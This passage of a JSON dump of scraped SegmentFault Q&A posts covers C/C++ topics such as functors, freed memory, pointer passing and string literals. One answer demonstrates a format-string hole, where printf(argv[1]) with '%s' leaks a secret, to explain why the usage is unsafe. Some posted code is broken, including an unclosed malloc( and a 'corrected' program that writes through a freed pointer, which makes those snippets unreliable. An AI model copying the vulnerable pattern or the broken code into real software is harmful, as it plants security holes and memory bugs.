      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002648639\">\n<p>myListSort这种用法称为“函数对象”或“仿函数”。从名称可以看出来，myListSort是一个类（或结构），而非函数，但是它的使用方法又颇似函数，即可以用调用函数的方式“调用”它，原因就在于它重载了调用操作符“()”。</p>\n<p>有什么好处呢？举个经典例子吧（C++ Primer上给出的）：假如你想统计一篇文章中有多少单词的长度在6以上，那么肯定需要定义一个函数，用来确定一个单词的长度是否在6以上，这个函数如下：</p>\n<pre><code>bool GT6(const string &amp;s) {\n  return s.size() &gt;= 6;\n}\n</code></pre>\n<p>然后把该函数传给count_if，用以统计vector words中长度在6以上的单词数量：</p>\n<pre><code>vector&lt;string&gt;::size_type wc = count_if(words.begin(), words.end(), GT6);\n</code></pre>\n<p>这个需求很容易实现，但是，问题在于，如果像上面一样把6写死在代码中，那么现在新来了一个需求，要统计长度在5以上的单词数量，或者长度在10以上的单词数量，就意味着我们必须重新实现类似的函数GT5和GT10。如果有更多类似需求呢？是不是要一个函数一个函数都实现了呢？</p>\n<p>用函数对象可以帮我们省去这些麻烦。因为函数对象是类类型，可以有自己的数据成员。定义一个数据成员bound，初始化函数对象的时候就顺便为bound赋值了。假如想要统计长度在5以上的单词数量，则bound=5;6以上，则bound=6,以此类推，具体代码如下：</p>\n<pre><code>class GT_cls {\n public:\n  GT_cls(size_t val = 0) : bound(val) { }\n  bool operator() (const string &amp;s) {\n    return s.size() &gt;= bound;\n  }\n private:\n  std::string::size_type bound;\n};\n</code></pre>\n<p>现在，假如你想统计words中长度在5以上的单词数量，代码如下：</p>\n<pre><code>vector&lt;string&gt;::size_type wc = count_if(words.begin(), words.end(), GT_cls(5));\n</code></pre>\n<p>同理，想要统计words中长度在6以上的单词数量，代码如下：</p>\n<pre><code>vector&lt;string&gt;::size_type wc = count_if(words.begin(), words.end(), GT_cls(6));\n</code></pre>\n<p>显然，用函数对象的好处就在于它可以拥有数据成员，从而让这个“仿函数”更加灵活易用。</p>\n<p>再举一例，比如你想定义一个最近邻函数。何为“最近”？这就意味着我们必须定义一种距离度量。假如我们使用的是加权欧式距离作为度量。在C语言中，可以把距离度量作为函数指针传入最近邻函数，在C++中，我们有更加方便的函数对象！于是，我们可以把“权值”放在函数对象中，作为它的数据成员。根据不同的要求，用不同的权值初始化函数对象，这样就能让最近邻函数产生不同的结果！</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002647605\">\n<p>上面那种是 functions, 下面这种叫做 functors. ( 我姑且翻译成函子 )</p>\n<p>两者最本质的区别在于，上面仅仅是一个<strong>过程</strong>；而下面，却可以包含<strong>状态</strong>。后者，可以轻松实现闭包。</p>\n<p>在 C++11 里面，后者直接演化为 lambda 了。</p>\n<hr>\n<p>我就用你提到的 <code>sort</code> 来举一个小例子：</p>\n<pre><code>cpp</code><code>bool myfunction (int i,int j) { return (i&lt;j); }\n\nstruct myclass {\n  bool operator() (int i,int j) { return (i&lt;j);}\n} myobject;\n\nstd::vector&lt;int&gt; myvector{32,71,12,45,26,80,53,33};\n\nstd::sort (myvector.begin(), myvector.end(), myfunction);\nstd::sort (myvector.begin(), myvector.end(), myobject);\n</code></pre>\n<p>简化了你的例子，我们来关注本质区别。看起来，好像等效对不？</p>\n<p>那么现在需求变了，排序的时候，我只希望排<strong>值大于 <code>40</code></strong> 的元素，请问咋整，你说，只好把这个 <code>40</code> 写到函数里了。那如果我说这个 <code>40</code> 是来自用户输入呢？也可能是 <code>50</code> 或是 <code>60</code>，请问怎么办？</p>\n<p>此时，function 好像有点没有用武之地了。但我们的 functor 却依然可以大显身手。</p>\n<pre><code>cpp</code><code>struct myclass {\n    int flag;\n    myclass(int i) : flag(i) { }\n    bool operator() (int i,int j) { return ((flag &lt; i || flag &lt; j) &amp;&amp; i &lt; j);}\n};\n\nstd::vector&lt;int&gt; myvector{32,71,12,45,26,80,53,33};\nmyclass myobject(40);\nstd::sort (myvector.begin(), myvector.end(), myobject);\n\n// output: 32 12 26 33 45 53 71 80\n</code></pre>\n<p>例子可能有点怪。。但你明白这意思了么？</p>\n</hr></div>",
      "attention": "8",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002647512\">\n<p>看有的代码可以用函数实现，却用类来封装.</p>\n<p>具体例子是这样：<br>\n比如STL的list容器，sort的函数可以自定义<br>\n一般这样处理：</br></br></p>\n<pre><code>// comparison, not case sensitive.\nbool compare_nocase (string first, string second)\n{\n  unsigned int i=0;\n  while ( (i&lt;first.length()) &amp;&amp; (i&lt;second.length()) )\n  {\n    if (tolower(first[i])&lt;tolower(second[i])) return true;\n    ++i;\n  }\n  if (first.length()&lt;second.length()) return true;\n  else return false;\n}\nmylist.sort(compare_nocase);\n</code></pre>\n<p>这个是c++参考手册的例子，项目中我看到好多地方这么用了</p>\n<pre><code>    struct mylistSort {\n        bool operator() (string first, string second) const {\n            //todo\n        }\n    };\n    mylist.sort(mylistSort());\n</code></pre>\n<p>这样有很明显的好处 还是单纯的风格问题，完全等价？</p>\n</div>",
      "favourite": "5",
      "glance": "2.7k",
      "tags": [
        "c++"
      ],
      "time": "2015-04-03",
      "title": "C++用类封装函数有什么好处么？",
      "url": "https://segmentfault.com/q/1010000002647512"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000004936735\">\n<p>你可以理解你复制的东西是一个Object，具体粘贴成什么样子，就看目标软件从你的Object当中获取了哪些内容</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000004937660\">\n<p>本质上应该是二进制吧<br>在windows上，可以通过调用不同的的方法，直接取出音频，图像或文本对象<br>网页的话，取出的应该都是string</br></br></p>\n<p>如果用的是.net,可以用 System.Windows.Clipboard 这个类<br>复制的是网页时，Clipboard.GetText(TextDataFormat.Html)应该就能取出html字符串<br>具体参考MSDN: <a href=\"https://msdn.microsoft.com/zh-cn/library/system.windows.clipboard(v=vs.110).aspx\">https://msdn.microsoft.com/zh-cn/library...</a></br></br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000004945681\">\n<html><body>\n<p><img data-src=\"/img/bVuUK0\"/></p>\n<p>网页的HTML吧,Notepad++有粘贴为html的选项</p>\n</body></html>\n</div>",
      "attention": "13",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000004934818\">\n<html><body>\n<p>不好意思,我也不知道这个问题去哪个栏目问,该在那个编程语言板块,我就都问问吧,总有懂的人!</p>\n<p>就是比如我复制一个网页的内容,其中有文本,也有图片,</p>\n<p>要是把他粘贴到一个*.txt里,他就粘贴出来是一个纯字符串;</p>\n<p>要是把他粘贴到一个word文档里,他就是包含html 标签和 css 样式的一段排好版的文字;</p>\n<p>要是把他粘贴到 QQ聊天窗口,就是 图片 + 字符串,</p>\n<p>我就不明白我剪切板里到底是个什么东西?</p>\n<p>这个东西是用什么编码的?</p>\n<p>其实为问这个的目的,就是想重新编码剪切板..</p>\n<p><img data-src=\"/img/bVuRWg\"><br><img data-src=\"/img/bVuRWh\"><br><img data-src=\"/img/bVuRWk\"/></br></img></br></img></p>\n</body></html>\n</div>",
      "favourite": "1",
      "glance": "1k",
      "tags": [
        "c",
        "c++",
        "vb.net",
        "javascript",
        "php"
      ],
      "time": "4-14",
      "title": "当你复制一个网页的时候,你的剪切板里是什么呢?",
      "url": "https://segmentfault.com/q/1010000004934818"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000248781\">\n<p>C++ 领域内的字符串实现，往往都跟某个类库或者框架有关，比如QString（Qt），CString（MFC），TString（VCL）……而标准库提供的 std::string 和 std::wstring 由于实现方式的问题又不适合出现在动态库接口中。</p>\n<p>那么，有没有什么框架无关的，轻量级的（最好两个文件搞定），接口完善能使用与动态库的，并且经项目检验比较可靠的开源实现呢？</p>\n</div>",
      "favourite": "1",
      "glance": "2.7k",
      "tags": [
        "c++",
        "字符串"
      ],
      "time": "2013-06-27",
      "title": "C++ 字符串有哪些轻量级，接口完善，可靠性高的开源实现？",
      "url": "https://segmentfault.com/q/1010000000248781"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000253865\">\n<p>十几年前上学的时候，计算机还是紧缺资源，在没有购买个人电脑之前，我们通常会去学校的计算机室上机。计算机室有专人管理，规矩诸多，其中包括“不要随意修改系统配置文件”，“不要做和学习无关的事情”等等。而我们经常会很开心地先把autoexec.bat/config.sys大改一气（很没出息是吧，不久几十K字节的事儿么，:))，然后再往机器上拷贝个金庸群侠传之类的，偷偷玩上半个小时。第二天再去上机的时候，直奔昨天保存文件的目录。运气好的时候，文件还在，于是大喜，接着进度继续玩；运气不好的时候，不但文件已经被删，而且还发现机器上新增的病毒好厉害，-&gt;_-&gt;。</p>\n<p>说这个陈芝麻烂谷子，也许你已经明白我的意思。<br/>\n其实我想说的就是两点：<br/>\n1. 你可以不遵守规则，但不等于没有规则。<br/>\n2. 不遵守规则而产生的后果是不可预测的(undefined)。</p>\n<p>楼主没有明确说明为什么会认为free的内存仍然可用，以及为什么认为局部变量的数据仍然可用。<br/>\n为了说明问题，我假设以下的程序：</p>\n<pre><code>#include&lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint *lvret(void) {\n    int ret = 5;\n    return &amp;ret;\n}\n\nint main(void) {\n    int *p = lvret();\n    printf(\"%d\\n\",*p);\n}    \n</code></pre>\n<p>编译运行这个程序的结果很可能是5。<br/>\n所以函数结束后，局部变量的数据仍然可用是吗？</p>\n<p>再来考虑下面这个程序：</p>\n<pre><code>#include&lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint *lvret(void) {\n    int ret = 5;\n    return &amp;ret;\n}\n\nvoid mod(void) {\n    int a = 7;\n}\n\nint main(void) {\n    int *p = lvret();\n    mod();\n    printf(\"%d\\n\",*p);\n}\n</code></pre>\n<p>这个程序运行的结果很可能是7。<br/>\n显然，这个内存地址现在变得不那么可靠了。</p>\n<p>(<em>编译器还是会给出警告，比如gcc 4.8</em>）</p>\n<blockquote>\n<p>warning: function returns address of local variable [-Wreturn-local-addr]\n       return &amp;ret;</p>\n</blockquote>\n<p>所以这个例子告诉我们，你能够访问到的内存空间并不总是安全的。<br/>\n换句话说，你发现释放后的内存数据或者局部变量占用的内存仍然可以读写，只不过是偶然的情况 -- 刚好没有被别的程序动过而已。</p>\n<p>C语言并不是一个内存安全的语言。<br/>\nC++也不是，但C++11已经好很多了(接纳了smart pointer)。  </p>\n<p><strong>补充</strong></p>\n<p>以上主要说明楼主描述的操作为什么从根本上是需要避免的。<br/>\n再来补充回答一下楼主的疑问：</p>\n<p>问题1：<br/>\n是Heap(堆)的管理。<br/>\n楼主的潜台词应该是“既然内存释放了，那么在访问的时候为什么不出现<code>segmentation fault</code>”。\n回答是 -- 这是C运行库实施层面的问题。大多数运行库的实施不会试图去识别那些已经被\"free\"的内存块，并把它们退回系统(所谓退回系统，就是取消在进程地址空间上的映射)。因此，在访问这些地址的时候，<code>segmentation fault</code>没有如预料中出现。\n但并不全是这样，也有例外，比如说OpenBSD就是一个。访问<a href=\"http://en.wikipedia.org/wiki/Malloc#OpenBSD.27s_malloc\" rel=\"nofollow\">wiki</a>，你可以看到如下描述：</p>\n<blockquote>\n<p>On a call to free, memory is released and unmapped from the process address space using munmap. This system is designed to improve security by taking advantage of the address space layout randomization and gap page features implemented as part of OpenBSD's mmap system call, and to detect use-after-free bugs—as a large memory allocation is completely unmapped after it is freed, further use causes a segmentation fault and termination of the program.</p>\n</blockquote>\n<p>这也从侧面证明了楼主观察到的现象是不可靠的。<br/>\n(至于为什么多数运行库要采取这样的内存管理策略，又是另一个话题了)</p>\n<p>问题2：<br/>\n是Stack(栈)的管理。<br/>\n@精英王子 已经说明了。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000259512\">\n<p>内存管理有以下几个层次（从高到低）：C程序 - C库（malloc）- 操作系统 - 物理内存</p>\n<p>首先，操作系统保证每个进程都有独立的虚拟内存空间（32bit上应该是4G吧，一般进程也用不了这么多）。当然实际上物理内存是所有进程共享的，所以当你需要动态内存时，需要向操作系统申请，这时候虽然从你程序的角度，内存是连续的，其实是被操作系统映射到某一块物理内存而已。程序用完内存归还后，实际归还的部分可能被操作系统分配给其他进程。</p>\n<p>要注意，上面说的“归还”是malloc库的行为。malloc库会使用一些策略来提高内存使用的效率，比如程序需要使用10K内存时，malloc实际<em>可能</em>上会申请1M，因为一次系统调用开销很大；再比如即使你调用了<code>free</code>“归还“了程序使用的内存，malloc库也<em>可能</em>并未真正把这些内存归还给操作系统，因为将来程序可能还会再申请动态内存。</p>\n<p>malloc库有多种实现，我知道的一种是使用标记（tag）来存储内存的元信息。比如你申请了8个byte，得到的头指针地址是0x1001（实际内存为0x1001-0x1008），malloc会在0x1000（也就是头指针-1的位置）保存8，即这段内存的长度。等释放时，程序将头指针地址传给<code>free</code>，malloc库从头指针-1的位置发现需要释放的内存长度，释放内存（实际的操作可能只是将tag清空）。这就解释了：1. 为什么和<code>malloc</code>不同，<code>free</code>的参数只有一个头指针而不需要长度；2. <code>free</code>后内存实际上可能并未归还给操作系统。</p>\n<p>所以，访问被（程序）释放的内存是一种undefined行为，就是说结果是不确定的。在malloc库未将此内存归还给操作系统也未进行下一次动态分配时，这块内存事实上仍属于程序。而当malloc库不清理归还的内存时（多数实现都是如此），你能访问到的值仍是原来的值。这和函数调用完毕而未清理栈帧、后续调用函数可以访问到之前已经设置的局部变量值是一个道理。</p>\n<p>但是，当malloc库已经将内存归还给系统时，再去访问原来的地址（更别说写），由于这段地址已经不属于程序了，就会出现经典的segmentation fault。</p>\n<p>说到底，这些现象还是C语言库为了更有效率的实现而妥协的结果。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000253803\">\n<p>这是一个很复杂的问题，我谈谈自己的理解。</p>\n<p>首先你需要知道，进程使用的都是虚拟地址空间，每个进程都有独立的，完整的4GB(32bit下)地址空间，未必每一块内存都会映射到物理内存，这个映射工作是操作系统完成的。如果你访问了地址空间里未映射的内存，或者写了只读的区域，操作系统就会报错(Segment Fault错误，呵呵~)并终止你的程序。</p>\n<p>当一个进程开始运行时，会向操作系统申请一块“堆”内存，由程序自己对这块堆内存进行管理，malloc就是从这块内存中分配内存，在C语言中，这个申请和管理堆内存的工作是由运行库自动完成的。</p>\n<p>当free一块内存后，free(即运行库)会将这块内存标记为未使用，下次有可能会将这块内存分配出去。但这块内存对进程来说仍然是可以读写的，因为运行库已经向操作系统申请，自己来管理这块内存了。</p>\n<hr/>\n<p>局部变量是分配在栈上的，进程开始运行时，操作系统会分配给进程一块固定大小(通常是1MB)的栈，所谓分配和释放局部变量，都只是在移动栈顶指针而已，只要没超过栈的这1MB内存区域，都还是可以读写的。</p>\n<p>以上都是常见操作系统的典型行为，也许在某些操作系统和平台上并非这么工作，总之，使用已释放的内存是非常危险的行为。</p>\n<hr/>\n<p>有兴趣可以读这两本书《深入理解计算机系统》《链接装载与库》</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000253786\">\n<p>1.free 一段内存后，为什么还可以对这段内存进行读写。。。按照网上以及书上的说法，释放内存后，这段内存就不应该使用了，操作系统就可以分配给其他任务。。</p>\n<p>我的疑问是，释放内存后，这段内存资源还是否属于当前进程？？？</p>\n<p>如果属于当前进程，那么读写访问无可厚非。</p>\n<p>可是，操作系统可以再次利用这段内存并分配给其他人,那么这里的 “其他”只是限定在当前进程中吗，只是给当前进程其他代码中的内存申请来使用么？</p>\n<p>2.局部的数组，在函数运行完毕后，应该释放，但是为什么依然可以读写其中的数据  ？</p>\n</div>",
      "favourite": "18",
      "glance": "11.7k",
      "tags": [
        "c",
        "c++"
      ],
      "time": "2013-07-13",
      "title": "free释放内存后，内存空间的疑问",
      "url": "https://segmentfault.com/q/1010000000253786"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000270566\">\n<p>娘的……答案评论里不支持贴代码，那我就另外加一个答案吧。对于最佳答案的一些评论</p>\n<ol>\n<li>printf 的原型是</li>\n</ol>\n<pre><code class=\"lang-c\">int printf ( const char * format, ... );\n</code></pre>\n<p>因此，<code>printf(str)</code> 是可行的。</p>\n<p>但是，如果 <code>str</code> 是用户输入的内容或外部获得的内容，<code>str</code> 中就可能含有恶意代码，可以用来进行内存溢出进而执行任意代码的攻击。因此，这样做应该是严格禁止的。—— Biergaizi</p>\n<ol>\n<li>c/c++对于申请的内存空间进行初始化是一个好习惯，所以做一个memset或者是把第一个单元初始化为零是值得鼓励的做法</li>\n<li>另外像楼上说的，malloc的内存要记得free，否则一会就没有内存可以用了。同时记得free之后把指针清零。避免代码过长之后，错误调用这个已经free的指针</li>\n<li>c中的字符串是必须以0结尾的。这里你用的strcpy在复制字符串的时候帮你做了这件事情。但是你要心里有数。</li>\n<li>你的GetMemory可以直接返回一个指针，就免去传递指针的指针这个问题了</li>\n</ol>\n<pre><code class=\"lang-c\">char* GetMemory()\n{\n   char* p = (char *)malloc(100);\n   memset(p, 0, SIZE); // or *p = 0;\n   return p;\n}\n</code></pre>\n<p>以下下代码在win7上编译，运行通过</p>\n<pre><code class=\"lang-c\">#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#define SIZE 100\nvoid GetMemory(char **p)\n{\n   *p = (char *)malloc(\n   memset(*p, 0, SIZE); // or **p = 0;\n}\n\nvoid Test(void) \n{\n    char *str = NULL;\n    GetMemory(&amp;str);   \n    strcpy(str, \"hello world\");\n    printf(str);\n    free( str);\n    str = NULL;\n}\n\nint main(void)\n{\n    Test();\n    return 0;\n}\n</code></pre>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000303380\">\n<p>最简单的回答就是楼主没有搞清楚：\n引用传递和值传递</p>\n<p>想要修改str指向的内容，你得把指向str的指针传过去</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000270062\">\n<p>提问者似乎不太了解 C 语言，建议阅读《K &amp; R》等基础教程。</p>\n<h1>变量赋值错误（崩溃原因）</h1>\n<p>你试图通过 <code>GetMemory()</code> 把 <code>*str</code> 指向一段 <code>malloc()</code> 分配的内存。</p>\n<p>但是，C 语言的函数传参是按值传参，<code>*str</code> 的值 <code>NULL</code> 被拷贝到 <code>*p</code>，随后 <code>*p</code> 被指向 <code>malloc()</code> 返回的值，此时 <code>GetMomory()</code> 函数结束。<code>*str</code> 的值仍然为 <code>NULL</code>，没有任何变化。之后，你使用 <code>strcpy</code> 企图把 <code>\"hello world\"</code> 复制到 <code>NULL</code>，当然出错。</p>\n<p>正确的做法是，传递指针变量 <code>*str</code> 的地址给 <code>GetMemory(char **p)</code>。<code>*str</code> 本身就是一个指针，指向一个地址。<code>*str</code> 虽然是指针，但指针也有自己的地址，把 <code>*str</code> 的地址传给 <code>**p</code>，<code>**p</code> 便是一个指向指针的指针。</p>\n<p><strong>到此为止，你的主要问题已经解决。可以跳过剩余部分直接看代码</strong>。</p>\n<h1>遗漏 <code>free()</code>\n</h1>\n<p>程序退出后，操作系统会自动释放所有内存。但是，使用完内存后立刻释放永远没错。</p>\n<h1>\n<code>printf()</code> 用法错误</h1>\n<p>另外，你的 <code>printf()</code> 用法错误。<code>printf()</code> 的参数不能直接是要打印的数据。而需要一个带转换说明符的<strong>字面字符串</strong>，后面的参数是要格式化的实参。</p>\n<p>有人说按照 <code>printf()</code> 的原型，直接跟一个字符串 <code>printf(str)</code> 也是没有问题的。然而，<code>str</code> 如果是从外部获得的内容，如用户输入的，会导致严重的安全问题。GCC 和 Clang 会对这样的用法都会产生警告。</p>\n<p>比如说，在老旧的 32 位 Linux 上：</p>\n<pre><code class=\"lang-c\">#include &lt;stdio.h&gt;\n\nint main(int argc, char **argv)\n{\n    char *secret = \"This is a secret!\\n\";\n    printf(argv[1]);\n    return 0;\n}\n</code></pre>\n<p>如果使用 <code>-mpreferred-stack-boundary=2</code> 编译</p>\n<pre><code>$ gcc -mpreferred-stack-boundary=2 FormatString.c -o FormatString\n$ ./FormatString %s\nThis is a secret!\n</code></pre>\n<p>哦？这是为什么？我对底层了解不多，只能说这和 <code>varargs</code> 的内存越界有关，而 <code>*secret</code> 正好在这个内存地址上。有没有联想到 OpenSSL 前些时间曝光了“心脏出血”漏洞？</p>\n<p><code>-mpreferred-stack-boundary=2</code> 并非攻击的必要手段。只要条件适宜，经过周密计算，危害可能比这大得多。</p>\n<p>因此这样的用法必须禁止，应使用</p>\n<pre><code>printf(\"%s\\n\", str);\n</code></pre>\n<p>或</p>\n<pre><code>puts(str);\n</code></pre>\n<h1>没有 <code>#include</code> 任何头文件</h1>\n<p>使用库函数前需要 <code>#include</code> 提供相应函数的头文件。</p>\n<ul>\n<li>\n<code>printf()</code> 由 <code>stdio.h</code> 提供</li>\n<li>\n<code>malloc()</code> 由 <code>stdlib.h</code> 提供</li>\n<li>\n<code>strcpy()</code> 由 <code>string.h</code> 提供</li>\n</ul>\n<h1>没有 <code>main()</code> 函数</h1>\n<p><code>main()</code> 函数是程序的入口，没有入口，程序从何处执行？</p>\n<hr>\n<p>更正后的程序如下。</p>\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nvoid GetMemory(char **p)\n{\n    *p = (char *)malloc(100);\n}\n\nvoid Test(void) \n{\n    char *str = NULL;\n    GetMemory(&amp;str);   \n    strcpy(str, \"hello world\");\n    printf(\"%s\\n\", str);\n\n    free(str);\n    *str = NULL; // 避免误用已悬空的指针\n}\n\nint main(void)\n{\n    Test();\n    return 0;\n}\n</code></pre>\n</hr></div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000270048\">\n<pre><code class=\"lang-c\">void GetMemory(char *p)\n{\n    p = (char *)malloc(100);\n}\nvoid Test(void) \n{\n    char *str = NULL;\n    GetMemory(str);   \n    strcpy(str, \"hello world\");\n    printf(str);\n}\n</code></pre>\n</div>",
      "favourite": "1",
      "glance": "3.2k",
      "tags": [
        "c++",
        "c"
      ],
      "time": "2013-08-28",
      "title": "为什么这个程序会崩溃",
      "url": "https://segmentfault.com/q/1010000000270048"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000496461\">\n<html><body>\n<p>最近在写光线跟踪程序，想实现一个n-Rook采样器。原理是是先在一个单位正方形的对角线上放置n个点，然后随机的将这n个点的x坐标打乱，从而保证：</p>\n<ol>\n<li>n个点均匀的分布在单位正方形上</li>\n<li>如果将正方形分成n*n个小正方形，那么每个大正方形的每行每列都只有一个元素。</li>\n</ol>\n<p>现在，我用C++将上面的思想实现出来，得出的结果是这样的<br><img data-src=\"http://segmentfault.com/img/bVcfjx\"><br>\n完美洗牌算法是参照Matrix87大神的文章实现的<a href=\"http://www.matrix67.com/blog/archives/879\" rel=\"nofollow\">http://www.matrix67.com/blog/archives/879</a></br></img></br></p>\n<p>主要的代码有:</p>\n<pre><code>NRook::NRook(int num) :Sampler(num)\n{\n    for (int i = 0; i &lt; num; i++)\n    {\n        sampleList[i].x = 1.f*(i) / numSample;\n        sampleList[i].y = 1.f*(i) / numSample;\n    }\n}\n\nvoid NRook::shuffle()\n{\n    for (int i = 0; i &lt; numSample; i++)\n    {\n        int targetX = randomGen.getRandomI(i, numSample);\n        std::swap(sampleList[i].x, sampleList[targetX].x);\n    }\n}\n\nstruct RandomGen{\n    virtual float getRandomF(){\n        return static_cast &lt;float&gt;(rand()) / static_cast &lt;float&gt;(RAND_MAX);\n    }\n    virtual float getRandomF(float a, float b) { return (b - a)*getRandomF() + a; }\n    virtual int getRandomI(){ return rand(); };\n    virtual int getRandomI(int a, int b){ return a + getRandomI() % (b - a); }\n};\n</code></pre>\n<p>请问这是选择算法的问题还是实现的问题</p>\n</body></html>\n</div>",
      "favourite": "1",
      "glance": "1.2k",
      "tags": [
        "c++",
        "图形学"
      ],
      "time": "2014-05-07",
      "title": "用完美洗牌算法实现n-Rook采样器遇到的问题",
      "url": "https://segmentfault.com/q/1010000000496461"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "5",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002299385\">\n<p>我写的是C++</p>\n<p>我希望对一些向量按其方向排序。我用下面的struct存向量</p>\n<pre><code>struct V { double x, y };\n</code></pre>\n<p>写下面的比较函数</p>\n<pre><code>inline bool operator&lt;(const V &amp;a, const V &amp;b)\n{\n    return atan2(a.y,a.x)&lt;atan2(b.y,b.x);\n}\n</code></pre>\n<p>我把它传进std::sort里，然后排序过程中越界了。具体数据较大，不便分析。</p>\n<p>然后我把V改成下面这样，并写一个构造函数</p>\n<pre><code>struct V\n{\n    double x, y, t;\n    V(double _x, double _y) : x(_x), y(_y), t(atan2(y,x)) {}\n};\n</code></pre>\n<p>比较函数改成</p>\n<pre><code>inline bool operator&lt;(const V &amp;a, const V &amp;b)\n{\n    return a.t&lt;b.t;\n}\n</code></pre>\n<p>这样就没问题了。</p>\n<p>我原来认为atan2就算计算有误差，传相同的参数进去也应该返回相同的值。上面的情况意味着不是这样吗？还是有别的什么问题？</p>\n<h1>以下为更新内容</h1>\n<p>我又做了如下实验，更没有头绪</p>\n<p>代码：</p>\n<pre><code>#include&lt;cmath&gt;\n#include&lt;iostream&gt;\nusing namespace std;\n\nint main()\n{\n    int x=-3, y=7;\n    double tmp=atan2(y,x);\n    cout &lt;&lt; (tmp==atan2(y,x)) &lt;&lt; endl;\n    double tmp2=atan2(y,x);\n    cout &lt;&lt; (tmp==tmp2) &lt;&lt; endl;\n    return 0;\n}\n</code></pre>\n<p>输出：</p>\n<p>0<br>\n   1</br></p>\n</div>",
      "favourite": "0",
      "glance": "1.5k",
      "tags": [
        "c",
        "c++"
      ],
      "time": "2014-11-21",
      "title": "C/C++ math.h中的函数传相同参数进去返回的值一定相同吗？",
      "url": "https://segmentfault.com/q/1010000002299385"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "11",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002412786\">\n<p>自己着手在写个完整的全新项目，之前也听说单元测试可以提高程序的健壮性。可是自己找不到合适的资料，对于如何编写单元测试，是一点都不懂。求推荐一些资料，或是单元测试框架~~</p>\n</div>",
      "favourite": "13",
      "glance": "2.4k",
      "tags": [
        "c++",
        "单元测试"
      ],
      "time": "2014-12-08",
      "title": "C++单元测试入门",
      "url": "https://segmentfault.com/q/1010000002412786"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002534183\">\n<p>char str1[]=\"abcd\";<br>\nchar *str2=\"abcd\";</br></p>\n<p>str1和str2的意义是不同的。跑代码的时候，内存通常被分为堆区，栈区，代码区，全局和静态变量区，常量区等。str1是普通的字符数组，是一个变量，如果它是全局的，就放在全局和静态区；如果是它是局部的，就放在栈里。str2是个字符串指针，它指向一段字符串常量“abcd”，这段字符串常量放在常量区，不能修改。</p>\n<p>你可以把str1看成一个指针，那是因为数组名就是数组的首地址，地址就是指针，仅此而已。如果你再声明一个char *str3 = \"abcd\";你会发现str2和str3是相等的，因为它们都指向同一个字符串常量，那个常量的位置固定，str2和str3自然相等。但是如果你再声明一个char str4[] = \"abcd\"; 你会发现str1和str4不相等，原因就是这两个字符数组存储在不同的位置，str1和str4作为首地址，当然也不同。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002533917\">\n<p>char *str2=\"abcd\";<br>\nstr2不能被修改</br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002533863\">\n<p>正好StackOverflow上有一个问题是关于\"char s[] 和 char *s\"的区别：<br><a href=\"http://stackoverflow.com/questions/1704407/what-is-the-difference-between-char-s-and-char-s-in-c\" rel=\"nofollow\">http://stackoverflow.com/questions/1704407/what-is-the-difference-between-char-s-and-char-s-in-c</a></br></p>\n<p>char *s所赋值的变量，会被编译器放在内存中栈的只读数据段。对于直接用s所做的修改，会因为错误的内存访问而发生段错误。</p>\n<p>证明：<br>\n你在<code>char *str2=\"abcd\";</code>下添加一行<code>str2[0] = 'b';</code>，那一行就会发生段错误了。</br></p>\n</div>",
      "attention": "5",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002533735\">\n<p>下面程序是用C语言写的逆置字符串，我觉得逆置函数没问题，但是传参数的不同会导致运行时的Segmentation fault (core dumped)，什么原因呢？</p>\n<pre><code>#include &lt;stdio.h&gt;\n\nvoid reverse(char *str){\n   char *end=str;\n   char tmp;\n   if(str){\n     while(*end){\n        ++end;\n     }\n     --end;\n     while(str&lt;end){\n       tmp=*str;\n       *str++=*end;\n       *end--=tmp;\n   }\n   }\n}\n\nint main()\n{\n     char str[][5]={\"abcd\",\"\",\"ab\",\"a\"};\n     int i;\n     for(i=0;i&lt;4;i++)\n     {\n     printf(\"%s\",str[i]);\n     reverse(str[i]);   //这种方式没有问题\n     printf(\"%s\\n\",str[i]);\n     }\n     char str1[]=\"abcd\";\n     char *str2=\"abcd\";\n     reverse(str1);\n     reverse(str2);   //这种方式会出现core dumped\n     printf(\"%s\\n\",str1);\n     printf(\"%s\\n\",str2);\n     return 0;\n}\n</code></pre>\n<hr>\n<p>update:感谢@spacewander的解答，后来亲自测试了下：</p>\n<pre><code>#include &lt;stdio.h&gt;\n\nvoid modify(char *str){\n    str[2]='a';\n}\nint main(){\n    char s[]=\"test\";\n    char *c=\"test\";\n    modify(s);\n    printf(\"%s\\n\",s);//正常\n    modify(c);      //core dumped\n    printf(\"%s\\n\",c);\n    return 0;\n}\n</code></pre>\n</hr></div>",
